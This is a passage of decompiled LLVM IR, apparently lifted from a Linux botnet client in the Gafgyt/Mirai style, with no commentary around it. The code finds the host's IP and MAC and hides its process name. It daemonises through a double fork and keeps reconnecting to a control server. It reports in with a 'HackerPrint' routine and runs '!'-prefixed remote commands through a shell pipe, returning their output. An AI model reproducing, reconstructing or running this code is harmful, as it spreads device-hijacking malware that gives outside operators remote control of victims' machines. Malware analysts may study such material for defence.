  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12dd4 = load i32, i32* @fp, align 4
  store i32 %v3_12dd4, i32* %stack_var_-16, align 4
  %v0_12df0 = call i32 @socket()
  %v3_12e00 = icmp eq i32 %v0_12df0, -1
  br i1 %v3_12e00, label %dec_label_pc_12e08, label %dec_label_pc_12e18

dec_label_pc_12e08:                               ; preds = %entry
  br label %dec_label_pc_13080

dec_label_pc_12e18:                               ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_21850.1263 to i32), i32* @r0, align 4
  %v2_12e5c = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_21850.1263 to i32))
  %v1_12e6c = call i32 @htons(i32 53)
  %v3_12e90 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_12e90 = call i32 @__libc_connect(i32 %v0_12df0, %sockaddr* %v3_12e90, i32 16)
  %v3_12ea0 = icmp eq i32 %v4_12e90, -1
  br i1 %v3_12ea0, label %dec_label_pc_12ea8, label %dec_label_pc_12eb8

dec_label_pc_12ea8:                               ; preds = %dec_label_pc_12e18
  br label %dec_label_pc_13080

dec_label_pc_12eb8:                               ; preds = %dec_label_pc_12e18
  store i32 16, i32* %stack_var_-72, align 4
  %v2_12ec0 = ptrtoint i32* %stack_var_-68 to i32
  %v2_12ec4 = ptrtoint i32* %stack_var_-72 to i32
  %v5_12ed0 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_12ed0 = call i32 @__GI_getsockname(i32 %v0_12df0, %sockaddr* %v5_12ed0, i32 %v2_12ec4, i32 %v2_12ec0, i32 16)
  %v3_12ee0 = icmp eq i32 %v6_12ed0, -1
  br i1 %v3_12ee0, label %dec_label_pc_12ee8, label %dec_label_pc_12ef8

dec_label_pc_12ee8:                               ; preds = %dec_label_pc_12eb8
  br label %dec_label_pc_13080

dec_label_pc_12ef8:                               ; preds = %dec_label_pc_12eb8
  store i32 ptrtoint (i32* @global_var_31848.479 to i32), i32* @r2, align 4
  %v4_12f0c = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_21858.1266, i32 0, i32 0), i32 0)
  %v2_12fa4 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_12f9c

dec_label_pc_12f1c:                               ; preds = %dec_label_pc_12f9c
  %v4_12f30 = call i32 @strstr(i32 %v2_12fa4, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21868.1268, i32 0, i32 0))
  %v2_12f38 = icmp eq i32 %v4_12f30, 0
  br i1 %v2_12f38, label %dec_label_pc_12f80, label %dec_label_pc_12f60.preheader

dec_label_pc_12f60.preheader:                     ; preds = %dec_label_pc_12f1c
  %v2_12f649 = load i8, i8* %stack_var_-4168, align 1
  %v7_12f6813 = icmp eq i8 %v2_12f649, 9
  br i1 %v7_12f6813, label %dec_label_pc_12f70, label %dec_label_pc_12f54

dec_label_pc_12f54:                               ; preds = %dec_label_pc_12f60.preheader, %dec_label_pc_12f54
  %v4_12f6014 = phi i32 [ %v1_12f58, %dec_label_pc_12f54 ], [ %v2_12fa4, %dec_label_pc_12f60.preheader ]
  %v1_12f58 = add i32 %v4_12f6014, 1
  %v5_12f5c = inttoptr i32 %v1_12f58 to i8*
  %v2_12f64 = load i8, i8* %v5_12f5c, align 1
  %v7_12f68 = icmp eq i8 %v2_12f64, 9
  br i1 %v7_12f68, label %dec_label_pc_12f70, label %dec_label_pc_12f54

dec_label_pc_12f70:                               ; preds = %dec_label_pc_12f54, %dec_label_pc_12f60.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_12f60.preheader ], [ %v5_12f5c, %dec_label_pc_12f54 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_12fc4

dec_label_pc_12f80:                               ; preds = %dec_label_pc_12f1c
  store i32 4096, i32* @r2, align 4
  %v3_12f98 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_12f9c

dec_label_pc_12f9c:                               ; preds = %dec_label_pc_12ef8, %dec_label_pc_12f80
  %v4_12fb4 = call i32 @fdgets(i32 %v2_12fa4, i32 4096, i32 %v4_12f0c, i32 %v2_12fa4)
  %v2_12fbc = icmp eq i32 %v4_12fb4, 0
  br i1 %v2_12fbc, label %dec_label_pc_12fc4, label %dec_label_pc_12f1c

dec_label_pc_12fc4:                               ; preds = %dec_label_pc_12f9c, %dec_label_pc_12f70
  %v1_12fc8 = call i32 @__libc_close(i32 %v4_12f0c)
  %v4_12fd8 = load i8, i8* %stack_var_-4168, align 1
  %v2_12fdc = icmp eq i8 %v4_12fd8, 0
  br i1 %v2_12fdc, label %dec_label_pc_13074, label %dec_label_pc_12fe4

dec_label_pc_12fe4:                               ; preds = %dec_label_pc_12fc4
  %v2_12fec = ptrtoint i32* %stack_var_-4200 to i32
  %v3_13004 = call i32 @strcpy(i32 %v2_12fec, i8* nonnull %stack_var_-4168)
  %v3_13024 = call i32 @ioctl(i32 %v0_12df0, i32 35111, i32 %v2_12fec)
  %v2_13044 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_13034

dec_label_pc_13034:                               ; preds = %dec_label_pc_12fe4, %dec_label_pc_13034
  %storemerge47 = phi i32 [ 0, %dec_label_pc_12fe4 ], [ %v1_13060, %dec_label_pc_13034 ]
  %v2_1304c = add i32 %storemerge47, %v2_13044
  %v1_13050 = inttoptr i32 %v2_1304c to i8*
  %v2_13050 = load i8, i8* %v1_13050, align 1
  %v4_13058 = add i32 %storemerge47, ptrtoint (i32* @global_var_2b5dc.1270 to i32)
  %v5_13058 = inttoptr i32 %v4_13058 to i8*
  store i8 %v2_13050, i8* %v5_13058, align 1
  %v1_13060 = add nuw nsw i32 %storemerge47, 1
  %v7_13070 = icmp slt i32 %v1_13060, 6
  br i1 %v7_13070, label %dec_label_pc_13034, label %dec_label_pc_13074

dec_label_pc_13074:                               ; preds = %dec_label_pc_13034, %dec_label_pc_12fc4
  %v1_13078 = call i32 @__libc_close(i32 %v0_12df0)
  %v3_13094.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_13090

dec_label_pc_13080:                               ; preds = %dec_label_pc_12ee8, %dec_label_pc_12ea8, %dec_label_pc_12e08
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_13090

dec_label_pc_13090:                               ; preds = %dec_label_pc_13074, %dec_label_pc_13080
  %v3_13094 = phi i32 [ %v3_13094.pre, %dec_label_pc_13074 ], [ 0, %dec_label_pc_13080 ]
  %v2_1309c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1309c, i32* @fp, align 4
  ret i32 %v3_13094

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_12f58, { 1, 0 }
  uselistorder i32 %v2_12fa4, { 1, 3, 0, 2 }
  uselistorder i32 %v0_12df0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 3, 5, 2, 0, 1, 4 }
  uselistorder i32 (i32)* @htons, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 15, 2, 1, 0 }
  uselistorder i32 53, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13090, { 1, 0 }
  uselistorder label %dec_label_pc_13034, { 1, 0 }
  uselistorder label %dec_label_pc_12f9c, { 1, 0 }
  uselistorder label %dec_label_pc_12f54, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v0_130cc = call i32 @access()
  %v7_130d4 = icmp eq i32 %v0_130cc, -1
  %v4_130f0 = select i1 %v7_130d4, i32 ptrtoint ([7 x i8]* @global_var_2188c.1276 to i32), i32 ptrtoint ([7 x i8]* @global_var_21884.1274 to i32)
  ret i32 %v4_130f0
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1310c = load i32, i32* @r4, align 4
  store i32 %v3_1310c, i32* %stack_var_-24, align 4
  store i32 78100, i32* %stack_var_-4, align 4
  %v19_1310c = ptrtoint i32* %stack_var_-24 to i32
  %v2_13110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_13110, i32* @fp, align 4
  %v0_1314c = call i32 @access()
  store i32 %v0_1314c, i32* @r0, align 4
  %v7_13154 = icmp eq i32 %v0_1314c, -1
  %. = select i1 %v7_13154, i32 ptrtoint ([19 x i8]* @global_var_218a0.1283 to i32), i32 ptrtoint ([5 x i8]* @global_var_21898.1281 to i32)
  %v0_13170 = call i32 @geteuid()
  %v2_13178 = icmp eq i32 %v0_13170, 0
  br i1 %v2_13178, label %dec_label_pc_13180, label %dec_label_pc_1318c

dec_label_pc_13180:                               ; preds = %entry
  store i32 0, i32* @global_var_2b1c8.1285, align 4
  br label %dec_label_pc_1318c

dec_label_pc_1318c:                               ; preds = %entry, %dec_label_pc_13180
  %v0_1318c = call i32 @getBuild()
  %v0_13198 = call i32 @getBuild()
  store i32 %v0_13198, i32* @r4, align 4
  %v2_131a4 = load i32, i32* @global_var_31848.479, align 4
  store i32 %v2_131a4, i32* @r0, align 4
  %v1_131a8 = call i32 @__GI_inet_ntoa(i32 %v2_131a4)
  %v0_131b4 = load i32, i32* @r4, align 4
  %v1_131b4 = inttoptr i32 %v0_131b4 to i8*
  %v1_131b8 = inttoptr i32 %v1_131a8 to i8*
  %v9_131bc = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_218b4.1288, i32 0, i32 0), i8* %v1_131b4, i8* %v1_131b8)
  %v1_131d0 = bitcast i8** %argv to i32*
  %v2_131d0 = load i32, i32* %v1_131d0, align 4
  store i32 %v2_131d0, i32* @r4, align 4
  %v2_131e8 = load i32, i32* %v1_131d0, align 4
  %v1_131ec = inttoptr i32 %v2_131e8 to i8*
  %v3_131f0 = call i32 @strlen(i8* %v1_131ec)
  %v0_131f8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_21894.1278 to i32), i32* @r1, align 4
  %v3_13204 = call i32 @strncpy(i32 %v0_131f8, i32 ptrtoint (i32* @global_var_21894.1278 to i32), i32 %v3_131f0)
  %v2_13218 = load i32, i32* %v1_131d0, align 4
  store i32 %v2_13218, i32* @r0, align 4
  %v2_13224 = call i32 @sprintf(i32 %v2_13218, i32 %.)
  %v0_13248 = call i32 @prctl()
  %v2_13250 = call i32 @__GI_time(i32* null)
  store i32 %v2_13250, i32* @r4, align 4
  %v0_13258 = call i32 @__libc_getpid()
  %v0_13260 = load i32, i32* @r4, align 4
  %v2_13260 = xor i32 %v0_13260, %v0_13258
  %v1_13268 = call i32 @srand(i32 %v2_13260)
  %v2_13270 = call i32 @__GI_time(i32* null)
  store i32 %v2_13270, i32* @r4, align 4
  %v0_13278 = call i32 @__libc_getpid()
  %v0_13280 = load i32, i32* @r4, align 4
  %v2_13280 = xor i32 %v0_13280, %v0_13278
  %v1_13288 = call i32 @init_rand(i32 %v2_13280)
  %v1_1328c = call i32 @getOurIP(i32 %v1_13288)
  %v0_13290 = call i32 @__libc_fork()
  %v2_132a0 = icmp eq i32 %v0_13290, 0
  br i1 %v2_132a0, label %dec_label_pc_132d0, label %dec_label_pc_132c4

dec_label_pc_132c4:                               ; preds = %dec_label_pc_1318c
  %v2_132a8 = ptrtoint i32* %stack_var_-92 to i32
  %v3_132b8 = call i32 @__libc_waitpid(i32 %v0_13290, i32 %v2_132a8, i32 0)
  %v1_132c0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_132f0

dec_label_pc_132d0:                               ; preds = %dec_label_pc_1318c
  %v0_132d0 = call i32 @__libc_fork()
  %v2_132e0 = icmp eq i32 %v0_132d0, 0
  br i1 %v2_132e0, label %dec_label_pc_132f0, label %dec_label_pc_132e8

dec_label_pc_132e8:                               ; preds = %dec_label_pc_132d0
  %v1_132ec = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_132f0

dec_label_pc_132f0:                               ; preds = %dec_label_pc_132c4, %dec_label_pc_132d0, %dec_label_pc_132e8
  %v0_132f0 = call i32 @__GI_setsid()
  %v0_132f8 = call i32 @chdir()
  %v2_13304 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_13b58 = ptrtoint i32* %stack_var_-5252 to i32
  %v4_13b68 = bitcast i32* %stack_var_-5252 to i8*
  %v2_13664 = add i32 %v19_1310c, -5228
  %v1_13784 = or i32 %v2_13b58, 1
  %v5_13788 = inttoptr i32 %v1_13784 to i8*
  %v2_137a4 = or i32 %v2_13b58, 2
  %v2_138f4 = ptrtoint i32* %stack_var_-1156 to i32
  %v2_13904 = bitcast i32* %stack_var_-1156 to i8*
  %v2_13ae4 = bitcast i8** %stack_var_-132 to i32*
  %v2_13b18 = add i32 %v19_1310c, -108
  br label %dec_label_pc_1330c

dec_label_pc_1330c:                               ; preds = %dec_label_pc_1331c, %dec_label_pc_13b48, %dec_label_pc_132f0
  %v0_1330c = call i32 @initConnection()
  %v2_13314 = icmp eq i32 %v0_1330c, 0
  br i1 %v2_13314, label %dec_label_pc_13328, label %dec_label_pc_1331c

dec_label_pc_1331c:                               ; preds = %dec_label_pc_1330c
  %v1_13320 = call i32 @sleep(i32 5)
  br label %dec_label_pc_1330c

dec_label_pc_13328:                               ; preds = %dec_label_pc_1330c
  %v2_1332c = load i32, i32* @global_var_2b5d0.55, align 4
  store i32 %v2_1332c, i32* @r4, align 4
  %v2_13334 = load i32, i32* @global_var_31848.479, align 4
  store i32 %v2_13334, i32* @r0, align 4
  %v1_13338 = call i32 @__GI_inet_ntoa(i32 %v2_13334)
  store i32 %v1_13338, i32* @r5, align 4
  %v0_13340 = call i32 @getBuild()
  %v0_13350 = load i32, i32* @r4, align 4
  %v0_13358 = load i32, i32* @r5, align 4
  store i32 %v0_13358, i32* @r2, align 4
  %v2_13360 = call i32 @HackerPrint(i32 %v0_13350, i32 ptrtoint (i32* @global_var_218c8.1295 to i32))
  br label %dec_label_pc_13b48

dec_label_pc_13384:                               ; preds = %dec_label_pc_1363c, %dec_label_pc_135e0
  %v3_13388 = mul i32 %storemerge16, 4
  %v2_13394 = load i32, i32* @global_var_31854.64, align 4
  %v2_13398 = add i32 %v2_13394, %v3_13388
  %v1_1339c = inttoptr i32 %v2_13398 to i32*
  %v2_1339c = load i32, i32* %v1_1339c, align 4
  %v3_133ac = call i32 @__libc_waitpid(i32 %v2_1339c, i32 0, i32 1)
  %tmp94 = icmp slt i32 %v3_133ac, 1
  br i1 %tmp94, label %dec_label_pc_135d4, label %dec_label_pc_13414

dec_label_pc_133cc:                               ; preds = %dec_label_pc_13414, %dec_label_pc_13458
  %v3_133d0 = mul i32 %v1_133c0, 4
  %v2_133dc = load i32, i32* @global_var_31854.64, align 4
  %v2_133e0 = add i32 %v2_133dc, %v3_133d0
  %v1_133e4 = add i32 %v2_133e0, -4
  %v1_13400 = inttoptr i32 %v2_133e0 to i32*
  %v2_13400 = load i32, i32* %v1_13400, align 4
  %v2_13404 = inttoptr i32 %v1_133e4 to i32*
  store i32 %v2_13400, i32* %v2_13404, align 4
  br label %dec_label_pc_13414

dec_label_pc_13414:                               ; preds = %dec_label_pc_13384, %dec_label_pc_133cc
  %v3_133bc.sink = phi i32 [ %v1_133c0, %dec_label_pc_133cc ], [ %storemerge16, %dec_label_pc_13384 ]
  %v1_133c0 = add i32 %v3_133bc.sink, 1
  %v5_13430 = load i32, i32* @global_var_2b5d8.62, align 4
  %v9_13450 = icmp eq i32 %v5_13430, 0
  br i1 %v9_13450, label %dec_label_pc_13458, label %dec_label_pc_133cc

dec_label_pc_13458:                               ; preds = %dec_label_pc_13414
  %v2_13430 = load i32, i32* @global_var_2b5d4.61, align 4
  %tmp95 = icmp ugt i32 %v2_13430, %v1_133c0
  br i1 %tmp95, label %dec_label_pc_133cc, label %dec_label_pc_13488

dec_label_pc_13488:                               ; preds = %dec_label_pc_13458
  %v3_1348c = mul i32 %v1_133c0, 4
  %v2_13498 = load i32, i32* @global_var_31854.64, align 4
  %v2_1349c = add i32 %v3_1348c, -4
  %v1_134a0 = add i32 %v2_1349c, %v2_13498
  %v2_134a8 = inttoptr i32 %v1_134a0 to i32*
  store i32 0, i32* %v2_134a8, align 4
  %v2_134b0 = load i32, i32* @global_var_2b5d4.61, align 4
  %v5_134b0 = load i32, i32* @global_var_2b5d8.62, align 4
  %v2_134bc = add i32 %v2_134b0, -1
  %v3_134bc = icmp ne i32 %v2_134b0, 0
  %v3_134c0 = add i32 %v5_134b0, -1
  %v4_134c0 = zext i1 %v3_134bc to i32
  %v5_134c0 = add i32 %v3_134c0, %v4_134c0
  store i32 %v2_134bc, i32* @global_var_2b5d4.61, align 4
  store i32 %v5_134c0, i32* @global_var_2b5d8.62, align 4
  %v3_134d4 = udiv i32 %v2_134bc, 1073741824
  %v3_134d8 = mul i32 %v5_134c0, 4
  %v2_134dc = or i32 %v3_134d8, %v3_134d4
  store i32 %v2_134dc, i32* @r4, align 4
  %v3_134e0 = mul i32 %v2_134bc, 4
  %v1_134e4 = add i32 %v3_134e0, 4
  %v1_134ec = call i32 @malloc(i32 %v1_134e4)
  br label %dec_label_pc_13544

dec_label_pc_13504:                               ; preds = %dec_label_pc_13544, %dec_label_pc_13588
  %v3_13508 = mul i32 %storemerge20, 4
  %v2_13514 = add i32 %v3_13508, %v1_134ec
  %v2_13528 = load i32, i32* @global_var_31854.64, align 4
  %v2_1352c = add i32 %v2_13528, %v3_13508
  %v1_13530 = inttoptr i32 %v2_1352c to i32*
  %v2_13530 = load i32, i32* %v1_13530, align 4
  %v2_13534 = inttoptr i32 %v2_13514 to i32*
  store i32 %v2_13530, i32* %v2_13534, align 4
  %v1_1353c = add i32 %storemerge20, 1
  br label %dec_label_pc_13544

dec_label_pc_13544:                               ; preds = %dec_label_pc_13488, %dec_label_pc_13504
  %storemerge20 = phi i32 [ 0, %dec_label_pc_13488 ], [ %v1_1353c, %dec_label_pc_13504 ]
  %v5_13560 = load i32, i32* @global_var_2b5d8.62, align 4
  %v9_13580 = icmp eq i32 %v5_13560, 0
  br i1 %v9_13580, label %dec_label_pc_13588, label %dec_label_pc_13504

dec_label_pc_13588:                               ; preds = %dec_label_pc_13544
  %v2_13560 = load i32, i32* @global_var_2b5d4.61, align 4
  %tmp = icmp ugt i32 %v2_13560, %storemerge20
  br i1 %tmp, label %dec_label_pc_13504, label %dec_label_pc_135b8

dec_label_pc_135b8:                               ; preds = %dec_label_pc_13588
  %v2_135bc = load i32, i32* @global_var_31854.64, align 4
  %v1_135c4 = call i32 @free(i32 %v2_135bc)
  store i32 %v1_134ec, i32* @global_var_31854.64, align 4
  br label %dec_label_pc_135d4

dec_label_pc_135d4:                               ; preds = %dec_label_pc_13384, %dec_label_pc_135b8
  %v1_135d8 = add i32 %storemerge16, 1
  br label %dec_label_pc_135e0

dec_label_pc_135e0:                               ; preds = %dec_label_pc_13b48, %dec_label_pc_135d4
  %storemerge16 = phi i32 [ %v1_135d8, %dec_label_pc_135d4 ], [ 0, %dec_label_pc_13b48 ]
  %v3_135e8 = ashr i32 %storemerge16, 31
  %v2_135fc = load i32, i32* @global_var_2b5d4.61, align 4
  %v5_135fc = load i32, i32* @global_var_2b5d8.62, align 4
  %v3_1361c = icmp uge i32 %v5_135fc, %v3_135e8
  %v9_1361c = icmp eq i32 %v5_135fc, %v3_135e8
  %v2_13620 = xor i1 %v9_1361c, true
  %v3_13620 = and i1 %v3_1361c, %v2_13620
  br i1 %v3_13620, label %dec_label_pc_13384, label %dec_label_pc_13624

dec_label_pc_13624:                               ; preds = %dec_label_pc_135e0
  br i1 %v9_1361c, label %dec_label_pc_1363c, label %dec_label_pc_13654

dec_label_pc_1363c:                               ; preds = %dec_label_pc_13624
  %tmp108 = icmp ugt i32 %v2_135fc, %storemerge16
  br i1 %tmp108, label %dec_label_pc_13384, label %dec_label_pc_13654

dec_label_pc_13654:                               ; preds = %dec_label_pc_13624, %dec_label_pc_1363c
  %v2_13668 = add i32 %v2_13664, %v5_13b68
  %v3_13670 = inttoptr i32 %v2_13668 to i8*
  store i8 0, i8* %v3_13670, align 1
  %v2_13684 = call i32 @trim(i8* %v4_13b68)
  %v4_1369c = call i32 @strstr(i32 %v2_13b58, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d238.57, i32 0, i32 0))
  store i32 %v4_1369c, i32* @r2, align 4
  %v9_136b0 = icmp eq i32 %v4_1369c, %v2_13b58
  br i1 %v9_136b0, label %dec_label_pc_136b8, label %dec_label_pc_136d0

dec_label_pc_136b8:                               ; preds = %dec_label_pc_13654
  %v2_136bc = load i32, i32* @global_var_2b5d0.55, align 4
  %v3_136c8 = call i32 @HackerPrint(i32 %v2_136bc, i32 ptrtoint ([5 x i8]* @global_var_21950.1300 to i32))
  br label %dec_label_pc_13b48

dec_label_pc_136d0:                               ; preds = %dec_label_pc_13654
  %v6_136e4 = call i32 @strstr(i32 %v2_13b58, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21958.1302, i32 0, i32 0))
  %v9_136f8 = icmp eq i32 %v6_136e4, %v2_13b58
  br i1 %v9_136f8, label %dec_label_pc_13700, label %dec_label_pc_13708

dec_label_pc_13700:                               ; preds = %dec_label_pc_136d0
  %v1_13704 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_13708

dec_label_pc_13708:                               ; preds = %dec_label_pc_136d0, %dec_label_pc_13700
  %v2_1371c = load i8, i8* %v4_13b68, align 4
  %v7_13720 = icmp eq i8 %v2_1371c, 33
  br i1 %v7_13720, label %dec_label_pc_13744, label %dec_label_pc_13b48

dec_label_pc_13744:                               ; preds = %dec_label_pc_13708, %dec_label_pc_13754
  %v3_13728.sink = phi i8* [ %storemerge10, %dec_label_pc_13754 ], [ %v4_13b68, %dec_label_pc_13708 ]
  %v4_13728 = ptrtoint i8* %v3_13728.sink to i32
  %v1_1372c = add i32 %v4_13728, 1
  %storemerge10 = inttoptr i32 %v1_1372c to i8*
  %v2_13748 = load i8, i8* %storemerge10, align 1
  %v7_1374c = icmp eq i8 %v2_13748, 32
  br i1 %v7_1374c, label %dec_label_pc_13764, label %dec_label_pc_13754

dec_label_pc_13754:                               ; preds = %dec_label_pc_13744
  %v2_13758 = load i8, i8* %storemerge10, align 1
  %v2_1375c = icmp eq i8 %v2_13758, 0
  br i1 %v2_1375c, label %dec_label_pc_13764, label %dec_label_pc_13744

dec_label_pc_13764:                               ; preds = %dec_label_pc_13754, %dec_label_pc_13744
  %v2_13768 = load i8, i8* %storemerge10, align 1
  %v2_1376c = icmp eq i8 %v2_13768, 0
  br i1 %v2_1376c, label %dec_label_pc_13b48, label %dec_label_pc_13774

dec_label_pc_13774:                               ; preds = %dec_label_pc_13764
  store i8 0, i8* %storemerge10, align 1
  %v3_13794 = call i32 @strlen(i8* %v5_13788)
  %v1_137a8 = add i32 %v3_13794, %v2_137a4
  %v5_137ac = inttoptr i32 %v1_137a8 to i8*
  %v2_137f4 = add i32 %v1_137a8, -1
  br label %dec_label_pc_137dc

dec_label_pc_137b4:                               ; preds = %dec_label_pc_13808, %dec_label_pc_137dc
  %v3_137bc = call i32 @strlen(i8* %v5_137ac)
  %v1_137d0 = add i32 %v2_137f4, %v3_137bc
  %v3_137d8 = inttoptr i32 %v1_137d0 to i8*
  store i8 0, i8* %v3_137d8, align 1
  br label %dec_label_pc_137dc

dec_label_pc_137dc:                               ; preds = %dec_label_pc_13774, %dec_label_pc_137b4
  %v3_137e4 = call i32 @strlen(i8* %v5_137ac)
  %v1_137f8 = add i32 %v3_137e4, %v2_137f4
  %v1_137fc = inttoptr i32 %v1_137f8 to i8*
  %v2_137fc = load i8, i8* %v1_137fc, align 1
  %v7_13800 = icmp eq i8 %v2_137fc, 10
  br i1 %v7_13800, label %dec_label_pc_137b4, label %dec_label_pc_13808

dec_label_pc_13808:                               ; preds = %dec_label_pc_137dc
  %v3_13810 = call i32 @strlen(i8* %v5_137ac)
  %v1_13824 = add i32 %v3_13810, %v2_137f4
  %v1_13828 = inttoptr i32 %v1_13824 to i8*
  %v2_13828 = load i8, i8* %v1_13828, align 1
  %v7_1382c = icmp eq i8 %v2_13828, 13
  br i1 %v7_1382c, label %dec_label_pc_137b4, label %dec_label_pc_13834

dec_label_pc_13834:                               ; preds = %dec_label_pc_13808
  %v2_1385022 = load i8, i8* %v5_137ac, align 1
  %v7_1385426 = icmp eq i8 %v2_1385022, 32
  br i1 %v7_1385426, label %dec_label_pc_1386c, label %dec_label_pc_1385c

dec_label_pc_13840:                               ; preds = %dec_label_pc_1385c
  %v1_13844 = add i32 %v4_1384c28, 1
  %v5_13848 = inttoptr i32 %v1_13844 to i8*
  %v2_13850 = load i8, i8* %v5_13848, align 1
  %v7_13854 = icmp eq i8 %v2_13850, 32
  br i1 %v7_13854, label %dec_label_pc_1386c, label %dec_label_pc_1385c

dec_label_pc_1385c:                               ; preds = %dec_label_pc_13834, %dec_label_pc_13840
  %v4_1384c28 = phi i32 [ %v1_13844, %dec_label_pc_13840 ], [ %v1_137a8, %dec_label_pc_13834 ]
  %stack_var_-64.027 = phi i8* [ %v5_13848, %dec_label_pc_13840 ], [ %v5_137ac, %dec_label_pc_13834 ]
  %v2_13860 = load i8, i8* %stack_var_-64.027, align 1
  %v2_13864 = icmp eq i8 %v2_13860, 0
  br i1 %v2_13864, label %dec_label_pc_1386c, label %dec_label_pc_13840

dec_label_pc_1386c:                               ; preds = %dec_label_pc_13840, %dec_label_pc_1385c, %dec_label_pc_13834
  %stack_var_-64.0.lcssa = phi i8* [ %v5_137ac, %dec_label_pc_13834 ], [ %v5_13848, %dec_label_pc_13840 ], [ %stack_var_-64.027, %dec_label_pc_1385c ]
  %v4_1384c.lcssa = phi i32 [ %v1_137a8, %dec_label_pc_13834 ], [ %v1_13844, %dec_label_pc_13840 ], [ %v4_1384c28, %dec_label_pc_1385c ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_1387c = add i32 %v4_1384c.lcssa, 1
  %v2_138c033 = load i8, i8* %v5_137ac, align 1
  %v2_138c435 = icmp eq i8 %v2_138c033, 0
  br i1 %v2_138c435, label %dec_label_pc_138cc, label %dec_label_pc_13890

dec_label_pc_13890:                               ; preds = %dec_label_pc_1386c, %dec_label_pc_13890
  %v4_138bc37 = phi i32 [ %v1_138b4, %dec_label_pc_13890 ], [ %v1_137a8, %dec_label_pc_1386c ]
  %storemerge936 = phi i8* [ %v5_138b8, %dec_label_pc_13890 ], [ %v5_137ac, %dec_label_pc_1386c ]
  %v2_13894 = load i8, i8* %storemerge936, align 1
  %v3_13894 = zext i8 %v2_13894 to i32
  %v1_1389c = call i32 @__GI_toupper(i32 %v3_13894)
  %v1_138ac = trunc i32 %v1_1389c to i8
  store i8 %v1_138ac, i8* %storemerge936, align 1
  %v1_138b4 = add i32 %v4_138bc37, 1
  %v5_138b8 = inttoptr i32 %v1_138b4 to i8*
  %v2_138c0 = load i8, i8* %v5_138b8, align 1
  %v2_138c4 = icmp eq i8 %v2_138c0, 0
  br i1 %v2_138c4, label %dec_label_pc_138cc, label %dec_label_pc_13890

dec_label_pc_138cc:                               ; preds = %dec_label_pc_13890, %dec_label_pc_1386c
  %v2_138d0 = load i8, i8* %v5_137ac, align 1
  %v2_138d4 = icmp eq i8 %v2_138d0, 0
  br i1 %v2_138d4, label %dec_label_pc_138dc, label %dec_label_pc_139c0

dec_label_pc_138dc:                               ; preds = %dec_label_pc_138cc
  %v0_138dc = call i32 @listFork()
  %v2_138e4 = icmp eq i32 %v0_138dc, 0
  br i1 %v2_138e4, label %dec_label_pc_138ec, label %dec_label_pc_13b48

dec_label_pc_138ec:                               ; preds = %dec_label_pc_138dc
  store i32 1024, i32* @r2, align 4
  %v3_13904 = call i32 @__GI_memset(i8* %v2_13904, i32 0)
  %v6_13924 = call i32 @szprintf(i32 %v2_138f4, i32 ptrtoint ([8 x i8]* @global_var_2195c.1304 to i32), i32 %v1_1387c, i32 %v2_138f4, i32 ptrtoint (i32* @0 to i32))
  %v3_13940 = call i32 @fdpopen(i32 %v2_138f4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_21964.1306, i32 0, i32 0))
  br label %dec_label_pc_13988

dec_label_pc_13950:                               ; preds = %dec_label_pc_13988
  %v2_13960 = call i32 @trim(i8* %v2_13904)
  store i32 1024, i32* @r2, align 4
  %v3_1397c = call i32 @__GI_memset(i8* %v2_13904, i32 0)
  %v1_13984 = call i32 @sleep(i32 1)
  br label %dec_label_pc_13988

dec_label_pc_13988:                               ; preds = %dec_label_pc_138ec, %dec_label_pc_13950
  %v4_139a0 = call i32 @fdgets(i32 %v2_138f4, i32 1024, i32 %v3_13940, i32 %v2_138f4)
  %v2_139a8 = icmp eq i32 %v4_139a0, 0
  br i1 %v2_139a8, label %dec_label_pc_139b0, label %dec_label_pc_13950

dec_label_pc_139b0:                               ; preds = %dec_label_pc_13988
  %v1_139b4 = call i32 @fdpclose(i32 %v3_13940)
  %v1_139bc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_139c0

dec_label_pc_139c0:                               ; preds = %dec_label_pc_138cc, %dec_label_pc_139b0
